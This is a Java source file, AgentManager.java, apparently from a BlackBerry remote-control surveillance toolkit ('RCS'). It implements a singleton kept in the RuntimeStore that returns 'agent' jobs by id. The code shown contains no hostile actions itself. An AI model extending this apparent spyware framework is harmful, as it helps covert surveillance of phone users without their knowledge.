//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AgentManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import net.rim.device.api.system.RuntimeStore;
import blackberry.agent.Agent;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;
import blackberry.threadpool.TimerJob;


/**
 * The Class AgentManager.
 */
public final class AgentManager extends Manager implements Singleton {

    private static final long GUID = 0xfa169781286585c3L;

    /** The debug instance. */
    //#ifdef DEBUG
    static Debug debug = new Debug("AgentManager", DebugLevel.VERBOSE);
    //#endif

    /** The instance. */
    static AgentManager instance = null;

    /**
     * Gets the single instance of AgentManager.
     * 
     * @return single instance of AgentManager
     */
    public static synchronized AgentManager getInstance() {
        if (instance == null) {
            instance = (AgentManager) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final AgentManager singleton = new AgentManager();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    /**
     * Instantiates a new agent manager.
     */
    private AgentManager() {
        super();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getAllItems()
     */
    public Vector getAllItems() {
        //#ifdef DBC
        Check.requires(statusObj != null, "Null status");
        //#endif
        final Vector agents = statusObj.getAgentsList();
        return agents;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getItem(int)
     */
    public TimerJob getItem(final int id) {
        //#ifdef DBC
        Check.requires(statusObj != null, "Null status");
        //#endif
        final Agent agent = statusObj.getAgent(id);
        //#ifdef DBC
        if(agent!=null){
            Check.ensures(agent.agentId == id, "Wrong id");
        }
        //#endif

        return agent;
    }
}
